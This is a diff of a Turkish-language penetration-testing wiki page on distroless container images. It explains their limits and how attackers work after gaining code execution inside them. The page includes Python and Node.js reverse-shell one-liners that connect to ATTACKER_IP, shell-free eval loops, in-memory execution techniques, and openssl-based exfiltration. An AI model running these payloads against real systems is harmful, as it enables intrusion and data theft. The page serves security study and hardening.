@@ -4,29 +4,29 @@
 
 ## Genel Bakış
 
-**distroless** container image, tek bir uygulamayı çalıştırmak için gereken **minimum runtime bileşenlerini** içeren ve package manager'lar, shell'ler ve geniş kapsamlı genel userland araçları gibi alışılagelmiş distribution araçlarını kasıtlı olarak kaldıran bir image'dır. Pratikte distroless image'lar çoğunlukla yalnızca uygulama binary'sini veya runtime'ını, paylaşılan library'leri, certificate bundle'larını ve çok küçük bir filesystem düzenini içerir.
+**Distroless** container image'ları, belirli bir uygulamayı çalıştırmak için gereken **minimum runtime bileşenlerini** içerirken paket yöneticileri, shell'ler ve genel amaçlı userland araçlarından oluşan geniş kümeler gibi alışılmış dağıtım araçlarını bilerek kaldırır. Pratikte distroless image'lar genellikle yalnızca uygulama binary'sini veya runtime'ını, paylaşılan kütüphanelerini, sertifika paketlerini ve çok küçük bir dosya sistemi düzenini içerir. <sup>[[1]](#references)</sup>
 
-Buradaki amaç, distroless'in yeni bir kernel isolation primitive olması değildir. Distroless bir **image design strategy**'sidir. Container filesystem'inin **içinde** nelerin kullanılabilir olduğunu değiştirir; kernel'in container'ı nasıl izole ettiğini değiştirmez. Bu ayrım önemlidir, çünkü distroless ortamı esas olarak code execution elde ettikten sonra bir attacker'ın kullanabileceği şeyleri azaltarak harden eder. Namespaces, seccomp, capabilities, AppArmor, SELinux veya başka bir runtime isolation mekanizmasının yerini almaz.
+Amaç, distroless'in yeni bir kernel izolasyon primitive'i olduğu değildir. Distroless bir **image tasarım stratejisidir**. Container dosya sistemi **içinde** nelerin bulunduğunu değiştirir; kernel'in container'ı nasıl izole ettiğini değil. Bu ayrım önemlidir; çünkü distroless, saldırganın kod yürütme elde ettikten sonra kullanabileceklerini azaltarak ortamı esas olarak harden eder. Namespaces, seccomp, capabilities, AppArmor, SELinux veya başka bir runtime izolasyon mekanizmasının yerini almaz.
 
 ## Distroless Neden Var?
 
-Distroless image'lar temel olarak şunları azaltmak için kullanılır:
+Distroless image'lar öncelikle şunları azaltmak için kullanılır:
 
-- image boyutu
-- image'ın operational complexity'si
-- vulnerability içerebilecek package ve binary sayısı
-- varsayılan olarak bir attacker'ın kullanabileceği post-exploitation tool sayısı
+- image boyutunu
+- image'ın operasyonel karmaşıklığını
+- güvenlik açığı içerebilecek paket ve binary sayısını
+- varsayılan olarak saldırganın kullanabileceği post-exploitation araçlarının sayısını
 
-Distroless image'ların production application deployment'larında popüler olmasının nedeni budur. Shell, package manager ve neredeyse hiç genel amaçlı tooling içermeyen bir container, genellikle operational olarak daha kolay anlaşılır ve compromise sonrasında interactive olarak abuse edilmesi daha zordur.
+Bu nedenle distroless image'lar production uygulama dağıtımlarında popülerdir. Shell, paket yöneticisi ve neredeyse hiç genel amaçlı araç içermeyen bir container'ı operasyonel olarak değerlendirmek genellikle daha kolay, ele geçirildikten sonra etkileşimli biçimde kötüye kullanmak ise daha zordur.
 
-İyi bilinen distroless-style image family'lerine örnekler:
+Bilinen distroless tarzı image ailelerine örnekler:
 
-- Google's distroless image'ları
-- Chainguard hardened/minimal image'ları
+- Google's distroless image'ları <sup>[[1]](#references)</sup>
+- Chainguard hardened/minimal image'ları <sup>[[2]](#references)</sup>
 
 ## Distroless Ne Anlama Gelmez?
 
-Bir distroless container:
+Distroless bir container:
 
 - otomatik olarak rootless değildir
 - otomatik olarak non-privileged değildir
@@ -34,38 +34,39 @@ Bir distroless container:
 - otomatik olarak seccomp, AppArmor veya SELinux tarafından korunmaz
 - otomatik olarak container escape'e karşı güvenli değildir
 
-Bir distroless image'ı `--privileged`, host namespace sharing, tehlikeli bind mount'lar veya mount edilmiş bir runtime socket ile çalıştırmak hâlâ mümkündür. Bu senaryoda image minimal olabilir, ancak container yine de catastrophically insecure olabilir. Distroless, **userland attack surface**'ini değiştirir; **kernel trust boundary**'yi değil.
+Distroless bir image'ı `--privileged`, host namespace'lerini paylaşarak, tehlikeli bind mount'larla veya mount edilmiş bir runtime socket'iyle çalıştırmak hâlâ mümkündür. Böyle bir senaryoda image minimal olabilir, ancak container yine de son derece güvensiz olabilir. Distroless, **userland attack surface'ünü** değiştirir; **kernel trust boundary'yi** değil.
 
-## Tipik Operational Özellikler
+## Tipik Operasyonel Özellikler
 
-Bir distroless container'ı compromise ettiğinizde genellikle ilk fark edeceğiniz şey, yaygın varsayımların artık geçerli olmamasıdır. `sh`, `bash`, `ls`, `id`, `cat` olmayabilir; hatta bazen alışılmış tradecraft'ınızın beklediği şekilde çalışan libc tabanlı bir environment bile bulunmayabilir. Tooling eksikliği debugging, incident response ve post-exploitation süreçlerini farklılaştırdığı için bu durum hem offense hem de defense'i etkiler.
+Distroless bir container'ı ele geçirdiğinizde genellikle ilk fark ettiğiniz şey, yaygın varsayımların artık geçerli olmamasıdır. `sh`, `bash`, `ls`, `id`, `cat` bulunmayabilir; hatta bazen alışılmış tradecraft'inizin beklediği şekilde çalışan libc tabanlı bir ortam bile olmayabilir. Araçların yokluğu hata ayıklamayı, incident response'u ve post-exploitation'ı farklı hâle getirdiğinden, bu durum hem saldırı hem de savunma tarafını etkiler.
 
-En yaygın pattern'ler şunlardır:
+En yaygın örüntüler şunlardır:
 
-- application runtime vardır, ancak başka çok az şey bulunur
-- shell tabanlı payload'lar shell olmadığı için başarısız olur
-- helper binary'ler eksik olduğu için yaygın enumeration one-liner'ları başarısız olur
-- read-only rootfs veya writable tmpfs konumlarında `noexec` gibi filesystem protection'ları da sıklıkla bulunur
+- uygulama runtime'ı vardır, ancak başka pek az şey bulunur
+- shell tabanlı payload'lar, shell olmadığı için başarısız olur
+- yardımcı binary'ler bulunmadığı için yaygın enumeration one-liner'ları başarısız olur
+- read-only rootfs veya yazılabilir tmpfs konumlarında `noexec` gibi dosya sistemi korumaları da çoğu zaman kullanılır
 
-İnsanların genellikle "weaponizing distroless" hakkında konuşmasına yol açan kombinasyon budur.
+Distroless'i "weaponize etmekten" söz edilmesine genellikle bu bileşim yol açar.
 
 ## Distroless ve Post-Exploitation
 
-Bir distroless environment'daki temel offensive challenge her zaman initial RCE değildir. Çoğu zaman asıl sorun bundan sonra gelir. Exploit edilen workload Python, Node.js, Java veya Go gibi bir language runtime'da code execution sağlıyorsa arbitrary logic çalıştırabilirsiniz; ancak bunu diğer Linux target'larında yaygın olan normal shell-centric workflow'lar üzerinden yapamayabilirsiniz.
+Distroless ortamındaki temel saldırı zorluğu her zaman ilk RCE değildir. Çoğu zaman asıl zorluk, sonrasında ne yapılacağıdır. Ele geçirilen workload Python, Node.js, Java veya Go gibi bir dil runtime'ında kod yürütme sağlıyorsa, normal shell merkezli iş akışlarını kullanmadan da rastgele mantık yürütmeniz mümkün olabilir. Bu tür iş akışları diğer Linux hedeflerinde yaygındır.
 
-Bu, post-exploitation sürecinin genellikle üç yönden birine kaydığı anlamına gelir:
+Bu nedenle post-exploitation genellikle şu üç yönden birine kayar:
 
-1. Environment'ı enumerate etmek, socket açmak, dosya okumak veya ek payload'ları stage etmek için **mevcut language runtime'ını doğrudan kullanmak**.
-2. Filesystem read-only ise veya writable konumlar `noexec` olarak mount edilmişse **kendi tooling'inizi memory'ye getirmek**.
-3. Application veya dependency'leri beklenmedik şekilde kullanışlı bir şey içeriyorsa **image'da zaten bulunan binary'leri abuse etmek**.
+1. Ortamı enumerate etmek, socket açmak, dosya okumak veya ek payload'ları stage etmek için **mevcut dil runtime'ını doğrudan kullanmak**.
+2. Dosya sistemi read-only ise veya yazılabilir konumlar `noexec` olarak mount edilmişse **kendi araçlarınızı belleğe getirmek**.
+3. Uygulamada veya bağımlılıklarında beklenmedik biçimde işe yarar bir şey varsa **image'da zaten bulunan binary'leri kötüye kullanmak**.
 
-## Abuse
+## Kötüye Kullanım
 
-### Sahip Olduğunuz Runtime'ı Enumerate Edin
+### Halihazırda Mevcut Runtime'ı Enumerate Edin
 
-Birçok distroless container'da shell yoktur; ancak hâlâ bir application runtime bulunur. Target bir Python service ise Python vardır. Target Node.js ise Node vardır. Bu çoğu zaman `/bin/sh` çağırmadan dosyaları enumerate etmek, environment variable'larını okumak, reverse shell açmak ve in-memory execution stage etmek için yeterli functionality sağlar.
+Birçok distroless container'da shell yoktur, ancak uygulama runtime'ı hâlâ bulunur. Hedef bir Python servisi ise Python vardır. Hedef Node.js ise Node vardır. Bu sayede genellikle dosyaları enumerate etmek, ortam değişkenlerini okumak, reverse shell açmak ve `/bin/sh`'i hiç çalıştırmadan bellekte yürütme için payload stage etmek mümkün olur.
 
 Python ile basit bir örnek:
+
 ```bash
 python3 - <<'PY'
 import os, socket, subprocess
@@ -75,130 +76,176 @@ print("env keys", list(os.environ)[:20])
 print("root files", os.listdir("/")[:30])
 PY
 ```
+
 Node.js ile basit bir örnek:
+
 ```bash
 node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
 ```
-Impact:
 
-- environment variables'ın kurtarılması; bunlar çoğunlukla credentials veya service endpoints içerir
-- `/bin/ls` olmadan filesystem enumeration
-- writable paths ve mounted secrets'ın belirlenmesi
+Etki:
 
-### Reverse Shell Without `/bin/sh`
+- genellikle kimlik bilgileri veya hizmet uç noktaları içeren ortam değişkenlerinin kurtarılması
+- `/bin/ls` olmadan dosya sisteminin listelenmesi
+- yazılabilir yolların ve bağlanan secret'ların belirlenmesi
 
-Image `sh` veya `bash` içermiyorsa classic shell-based reverse shell hemen başarısız olabilir. Bu durumda bunun yerine kurulu language runtime'ını kullanın.
+### `/bin/sh` Olmadan Etkileşimli Runtime
 
-Python reverse shell:
+Image `sh` veya `bash` içermiyorsa klasik shell tabanlı reverse shell başarısız olur. Bu durumda, mevcut olmayan bir shell başlatmak yerine kurulu dil runtime'ında etkileşimli bir oturum açın.
+
+Örneğin, bu Python payload'ı etkileşimli bir Python konsolunu bir socket üzerinden yönlendirir:
+
 ```bash
 python3 - <<'PY'
-import os,pty,socket
-s=socket.socket()
-s.connect(("ATTACKER_IP",4444))
-for fd in (0,1,2):
-os.dup2(s.fileno(),fd)
+import code, socket, sys
+s = socket.create_connection(("ATTACKER_IP", 4444))
+stream = s.makefile("rw", buffering=1)
+sys.stdin = sys.stdout = sys.stderr = stream
+code.interact(local=globals())
+PY
+```
+
+Eşdeğer Node.js yaklaşımı, bir socket üzerinden alınan JavaScript kodunu değerlendirebilir. Bu, işletim sistemi shell'i değil, bir JavaScript REPL'dir; dosya sistemi, süreç ve ağ işlemleri Node'un API'leri aracılığıyla gerçekleştirilmelidir:
+
+```bash
+node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
+```
+
+Her iki örnek de dışarıya bağlantı ve kullanılabilir bir interpreter gerektirir; ayrıca yalnızca bu interpreter'ın sunduğu işlevleri sağlar.
+
+Image beklenmedik şekilde `/bin/sh` içeriyorsa klasik interpreter destekli shell payload'ları yine işe yarar. Bunlar gerçekten shell-free olmadıkları için ayrı gösterilmiştir:
+
+```bash
+# Python plus an existing /bin/sh
+python3 - <<'PY'
+import os, pty, socket
+s = socket.create_connection(("ATTACKER_IP", 4444))
+for fd in (0, 1, 2):
+    os.dup2(s.fileno(), fd)
 pty.spawn("/bin/sh")
 PY
-```
-`/bin/sh` mevcut değilse, son satırı doğrudan Python ile komut çalıştırma veya Python REPL döngüsüyle değiştirin.
 
-Node reverse shell:
+# Node.js plus an existing /bin/sh
+node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
+```
+
+Eski Python command-loop kalıbı, `/bin/sh` bulunduğu ancak etkileşimli bir PTY kullanmanın elverişsiz olduğu durumlarda da faydalıdır. Gerçek bağımlılığı açıkça belirtilerek burada korunmuştur: `subprocess.run(..., shell=True)` sistem shell'ini çağırır ve bu nedenle **no-shell tekniği değildir**.
+
 ```bash
-node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
+python3 -c '
+import subprocess
+while True:
+    cmd = input("sh> ")
+    if cmd.strip() in ("exit", "quit"):
+        break
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    print(result.stdout, end="")
+    print(result.stderr, end="")
+'
 ```
-Yine de `/bin/sh` mevcut değilse, shell başlatmak yerine doğrudan Node'un dosya sistemi, process ve networking API'lerini kullanın.
 
-### Full Example: No-Shell Python Command Loop
+### Tam Örnek: Shell Olmadan Python Komut Döngüsü
 
-Image'da Python varsa ancak hiç shell yoksa, basit bir etkileşimli loop genellikle full post-exploitation capability'yi sürdürmek için yeterlidir:
+Image'da Python var ancak hiç shell yoksa, yerel bir Python REPL yine de dosya sistemi, ortam ve ağ incelemesini destekleyebilir:
+
 ```bash
 python3 - <<'PY'
-import os,subprocess
+namespace = {}
 while True:
-cmd=input("py> ")
-if cmd.strip() in ("exit","quit"):
-break
-p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
-print(p.stdout, end="")
-print(p.stderr, end="")
+    source = input("py> ")
+    if source.strip() in ("exit", "quit"):
+        break
+    try:
+        result = eval(source, namespace)
+        if result is not None:
+            print(repr(result))
+    except SyntaxError:
+        exec(source, namespace)
 PY
 ```
-Bu işlem, etkileşimli bir shell binary'si gerektirmez. Saldırganın bakış açısından etkisi temel bir shell ile fiilen aynıdır: mevcut runtime üzerinden command execution, enumeration ve ek payload'ların staging'i.
 
-### In-Memory Tool Execution
+Bu döngü `/bin/sh` çalıştırmaz. Python ifadelerini ve deyimlerini doğrudan değerlendirir; bu nedenle işlemler shell komutları yerine Python API'lerini kullanmalıdır. Bu kısıtlamaya rağmen temel bir shell'in sağladığı imkânların çoğunu sunabilir: dosya sistemi ve ortam değişkenlerini listeleme, verilere erişme, ağ etkinliği ve kurulu runtime üzerinden ek payload'ları aşamalı olarak yükleme.
+
+### Bellek İçi Araç Çalıştırma
 
 Distroless image'lar genellikle şunlarla birlikte kullanılır:
 
 - `readOnlyRootFilesystem: true`
-- `/dev/shm` gibi yazılabilir ancak `noexec` tmpfs
-- package management tool'larının bulunmaması
+- `/dev/shm` gibi yazılabilir ancak `noexec` olarak bağlanmış tmpfs
+- paket yönetimi araçlarının bulunmaması
 
-Bu kombinasyon, klasik "binary'yi diske indir ve çalıştır" workflow'larını güvenilmez hâle getirir. Bu durumlarda memory execution teknikleri temel çözüm hâline gelir.
+Bu birleşim, klasik "binary'yi diske indirip çalıştırma" iş akışlarını güvenilmez hâle getirir. Böyle durumlarda bellek içi çalıştırma teknikleri başlıca çözüm olur.
 
-Bunun için ayrılmış sayfa:
+Bununla ilgili özel sayfa:
 
 {{#ref}}
 ../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-Buradaki en ilgili teknikler şunlardır:
+Buradaki en ilgili teknikler:
 
-- scripting runtime'ları üzerinden `memfd_create` + `execve`
+- Scripting runtime'lar üzerinden `memfd_create` + `execve` <sup>[[4]](#references)</sup>
 - DDexec / EverythingExec
 - memexec
 - memdlopen
 
-### Image İçinde Zaten Bulunan Binary'ler
+Python, Node.js veya PHP kullanan bir servis için giriş noktası; template injection, prototype pollution veya güvenli olmayan değerlendirme gibi bir uygulama hatası olabilir. Bu hata süreç içinde code execution sağlarsa, `/proc/self/mem` tekniği shell veya diskte executable dosya olmadan bir loader çalıştırabilir. Bu, container sürecinin kimliğiyle çalışmaya devam eder; container escape için ayrı bir runtime veya host sınırı zafiyeti gerekir. Gereksinimler için [read-only/noexec/distroless tekniklerine](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) bakın.
 
-Bazı distroless image'lar, compromise sonrasında kullanışlı hâle gelen ve operasyonel olarak gerekli binary'leri hâlâ barındırır. Sık gözlemlenen bir örnek `openssl`'dir; çünkü uygulamalar crypto veya TLS ile ilgili görevler için zaman zaman buna ihtiyaç duyabilir.
+### Image'da Zaten Bulunan Binary'ler
 
-Hızlı bir arama pattern'i şöyledir:
+Bazı distroless image'larda, ele geçirilme sonrasında işe yarayabilecek ve operasyonel açıdan gerekli binary'ler bulunur. Sıkça gözlemlenen bir örnek `openssl`'dür; çünkü uygulamalar bazen şifreleme veya TLS ile ilgili işler için buna ihtiyaç duyar.
+
+Hızlı bir arama kalıbı:
+
 ```bash
 find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
 ```
+
 `openssl` mevcutsa şu amaçlarla kullanılabilir:
 
-- outbound TLS bağlantıları
-- izin verilen bir egress channel üzerinden data exfiltration
-- encoded/encrypted blob'lar aracılığıyla payload verilerinin staging işlemi
+- giden TLS bağlantıları
+- izin verilen bir egress kanalı üzerinden veri exfiltration
+- encoded/encrypted blob'lar aracılığıyla payload verilerini hazırlama
 
-Kesin abuse, gerçekte hangi bileşenlerin kurulu olduğuna bağlıdır; ancak genel fikir şudur: distroless, "hiçbir araç yok" anlamına gelmez; "normal bir distribution image'a kıyasla çok daha az araç" anlamına gelir.
+Tam olarak nasıl kötüye kullanılabileceği gerçekten kurulu olanlara bağlıdır; ancak genel fikir, distroless'ın "hiç araç yok" anlamına gelmediği, "normal bir dağıtım imajına kıyasla çok daha az araç olduğu" anlamına geldiğidir.
 
 ## Kontroller
 
-Bu kontrollerin amacı, image'ın pratikte gerçekten distroless olup olmadığını ve post-exploitation için hangi runtime veya helper binary'lerinin hâlâ kullanılabilir olduğunu belirlemektir.
+Bu kontrollerin amacı, imajın pratikte gerçekten distroless olup olmadığını ve post-exploitation için hangi runtime veya yardımcı binary'lerin hâlâ kullanılabilir olduğunu belirlemektir.
+
 ```bash
 find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
 which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
 cat /etc/os-release 2>/dev/null                                # Often missing or minimal
 mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
 ```
+
 Burada ilginç olanlar:
 
-- Shell yoksa ancak Python veya Node gibi bir runtime mevcutsa, post-exploitation runtime-driven execution'a yönelmelidir.
-- Root filesystem salt okunursa ve `/dev/shm` yazılabilir ancak `noexec` durumundaysa, memory execution teknikleri çok daha önemli hâle gelir.
-- `openssl`, `busybox` veya `java` gibi yardımcı binary'ler mevcutsa, daha ileri erişimi bootstrap etmek için yeterli işlevsellik sunabilirler.
+- Shell yoksa ancak Python veya Node gibi bir runtime varsa, post-exploitation süreci runtime tarafından yönlendirilen execution'a pivot etmelidir.
+- Root filesystem salt okunursa ve `/dev/shm` yazılabilir ancak `noexec` ise, memory execution teknikleri çok daha önemli hale gelir.
+- `openssl`, `busybox` veya `java` gibi yardımcı binary'ler varsa, daha fazla erişim elde etmek için gereken başlangıç işlevselliğini sağlayabilirler.
 
 ## Runtime Varsayılanları
 
-| Image / platform stili | Varsayılan durum | Tipik davranış | Yaygın manuel zayıflatma |
+| Image / platform tarzı | Varsayılan durum | Tipik davranış | Sık görülen manuel zayıflatmalar |
 | --- | --- | --- | --- |
-| Google distroless style images | Tasarım gereği minimal userland | Shell yok, package manager yok, yalnızca uygulama/runtime bağımlılıkları var | debugging katmanları, sidecar shell'ler eklemek veya busybox ya da tooling kopyalamak |
-| Chainguard minimal images | Tasarım gereği minimal userland | Azaltılmış package yüzeyi, genellikle tek bir runtime veya service'e odaklanır | `:latest-dev` ya da debug varyantlarını kullanmak, build sırasında tool'lar kopyalamak |
-| Distroless images kullanan Kubernetes workload'ları | Pod config'e bağlıdır | Distroless yalnızca userland'i etkiler; Pod security posture yine de Pod spec'ine ve runtime varsayılanlarına bağlıdır | ephemeral debug container'ları, host mount'larını veya privileged Pod ayarlarını eklemek |
-| Distroless images çalıştıran Docker / Podman | Run flag'lerine bağlıdır | Minimal filesystem, ancak runtime security yine flag'lere ve daemon configuration'a bağlıdır | `--privileged`, host namespace paylaşımı, runtime socket mount'ları, writable host bind'leri |
+| Google distroless tarzı image'lar | Tasarım gereği minimal userland | Shell yok, package manager yok; yalnızca uygulama/runtime bağımlılıkları var | Debugging katmanları veya sidecar shell'ler eklemek, busybox ya da araçları kopyalamak |
+| Chainguard minimal image'ları | Tasarım gereği minimal userland | Azaltılmış package yüzeyi; genellikle tek bir runtime veya service'e odaklı | `:latest-dev` veya debug varyantlarını kullanmak, build sırasında araçları kopyalamak |
+| Distroless image'lar kullanan Kubernetes workload'ları | Pod yapılandırmasına bağlı | Distroless yalnızca userland'i etkiler; Pod'un güvenlik duruşu yine Pod spec'e ve runtime varsayılanlarına bağlıdır | Ephemeral debug container'ları eklemek, host mount'ları kullanmak, privileged Pod ayarları |
+| Distroless image'lar çalıştıran Docker / Podman | Çalıştırma flag'lerine bağlı | Minimal filesystem; ancak runtime güvenliği yine flag''lere ve daemon yapılandırmasına bağlıdır | `--privileged`, host namespace paylaşımı, runtime socket mount'ları, yazılabilir host bind'leri |
 
-Temel nokta, distroless'ın bir **image özelliği** olması, runtime protection olmamasıdır. Değeri, compromise sonrasında filesystem içinde kullanılabilir olanları azaltmasından gelir.
+Önemli nokta, distroless'in bir **image özelliği** olmasıdır; runtime koruması değildir. Sağladığı değer, sistem ele geçirildikten sonra filesystem içinde nelerin kullanılabilir olduğunu azaltmasından gelir. Multi-stage build'ler, build araçlarını final image'ın dışında tutmanın yaygın bir yoludur. <sup>[[3]](#references)</sup>
 
 ## İlgili Sayfalar
 
-Distroless environment'larda yaygın olarak ihtiyaç duyulan filesystem ve memory-execution bypass'ları için:
+Distroless ortamlarında yaygın olarak gereken filesystem ve memory-execution bypass'ları için:
 
 {{#ref}}
 ../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-Distroless workload'larına hâlâ uygulanabilen container runtime, socket ve mount abuse için:
+Distroless workload'ları için de geçerli olan container runtime, socket ve mount kötüye kullanımı için:
 
 {{#ref}}
 runtime-api-and-daemon-exposure.md
@@ -208,4 +255,10 @@ runtime-api-and-daemon-exposure.md
 sensitive-host-mounts.md
 {{#endref}}
 
+## References
+
+- [1] [GoogleContainerTools - Distroless container image'ları](https://github.com/GoogleContainerTools/distroless)
+- [2] [Chainguard Images dokümantasyonu](https://edu.chainguard.dev/chainguard/chainguard-images/)
+- [3] [Docker Docs - Multi-stage build'ler](https://docs.docker.com/build/building/multi-stage/)
+- [4] [`memfd_create(2)` - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
 {{#include ../../../banners/hacktricks-training.md}}
